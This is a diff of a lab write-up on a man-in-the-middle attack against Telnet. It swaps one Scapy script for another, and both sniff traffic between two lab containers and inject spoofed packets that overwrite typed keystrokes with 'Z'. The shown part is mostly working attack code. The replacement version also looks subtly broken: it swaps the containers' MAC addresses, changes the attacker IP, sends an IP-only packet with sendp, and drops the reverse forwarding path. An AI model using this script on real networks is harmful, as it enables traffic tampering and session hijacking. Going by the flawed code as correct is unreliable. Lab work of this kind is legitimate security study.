@@ -138,64 +138,34 @@ Additionally, the code prints "Nigel is launching an MitM Attack on Telnet" to t
 ```
 #!/usr/bin/env python3
 from scapy.all import *
-
 print ("Nigel is injecting Z's")
 
-IP_A = "10.9.0.5"
-MAC_A = "02:42:0a:09:00:05"
-IP_B = "10.9.0.6"
-MAC_B = "02:42:0a:09:00:06"
-IP_M = "10.9.0.7"
-MAC_M = "02:42:0a:09:00:07"
+# Define the IP and MAC addresses of the containers
+container_a_ip = "10.9.0.5"
+container_a_mac = "02:42:0a:09:00:06"
+container_b_ip = "10.9.0.6"
+container_b_mac = "02:42:0a:09:00:05"
+attacker_ip = "10.9.0.105"
+attacker_mac = "02:42:0a:09:00:69"
 
-def spoof_pkt(pkt):
-    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
-        # Create a new packet based on the captured one.
-        # 1) We need to delete the checksum in the IP & TCP headers,
-        # because our modification will make them invalid.
-        # Scapy will recalculate them if these fields are missing.
-        # 2) We also delete the original TCP payload.
-        newpkt = IP(bytes(pkt[IP]))
-        del(newpkt.chksum)
-        del(newpkt[TCP].payload)
-        del(newpkt[TCP].chksum)
+# Define the spoofed packet
+def spoof_packet(packet):
+    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet[IP].src == container_a_ip and packet[IP].dst == container_b_ip:
+        # Get the raw data from the TCP packet
+        raw_data = packet[Raw].load.decode(errors='ignore')
+        # Replace each typed character with Z
+        modified_data = 'Z' * len(raw_data)
+        # Create a new IP header with the source and destination IP addresses
+        ip_header = IP(src=container_a_ip, dst=container_b_ip)
+        # Create a new TCP header with the source and destination port numbers
+        tcp_header = TCP(sport=packet[TCP].sport, dport=packet[TCP].dport, flags=packet[TCP].flags, seq=packet[TCP].seq, ack=packet[TCP].ack)
+        # Create a new packet with the spoofed IP and TCP headers and the modified raw data
+        spoofed_packet = ip_header/tcp_header/modified_data.encode()
+        # Send the spoofed packet to the target container B
+        sendp(spoofed_packet, iface='eth0', verbose=False)
 
-        # Construct the new payload based on the old payload.
-        if pkt[TCP].payload:
-            data = pkt[TCP].payload.load # The original payload data
-            newdata = b'Z' * len(data) # Replace each character with 'Z'
-            send(newpkt/newdata, iface='eth0', verbose=0, loop=0, count=1, 
-                 inter=0, timeout=None, realtime=False) # Send the spoofed packet to Host B
-        else:
-            send(newpkt, iface='eth0', verbose=0, loop=0, count=1, 
-                 inter=0, timeout=None, realtime=False)
-
-    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
-        # Create new packet based on the captured one
-        # Do not make any change
-        newpkt = IP(bytes(pkt[IP]))
-        del(newpkt.chksum)
-        del(newpkt[TCP].chksum)
-
-        send(newpkt, iface='eth0', verbose=0, loop=0, count=1, 
-             inter=0, timeout=None, realtime=False) # Send the packet to Host A
-
-    elif pkt[IP].src == IP_A and pkt[IP].dst == IP_M:
-        # Create a new packet based on the captured one.
-        # Modify the destination IP and MAC addresses to spoof the packet.
-        newpkt = IP(bytes(pkt[IP]))
-        newpkt.dst = IP_B
-        del(newpkt.chksum)
-
-        ethpkt = Ether(dst=MAC_B, src=MAC_M)
-        ethpkt.payload = newpkt
-        del(ethpkt.chksum)
-
-        sendp(ethpkt, iface='eth0', verbose=0, loop=0, count=1, 
-              inter=0, timeout=None, realtime=False) # Send the spoofed packet to Host B
-
-f = 'tcp and host 10.9.0.5 and host 10.9.0.6'
-pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt) # Sniff the traffic between Host A and Host B
+# Start sniffing for TCP packets between Container A and Container B
+sniff(filter='tcp and host %s and host %s' % (container_a_ip, container_b_ip), prn=spoof_packet)
 ```
 
 ### Second Attempt
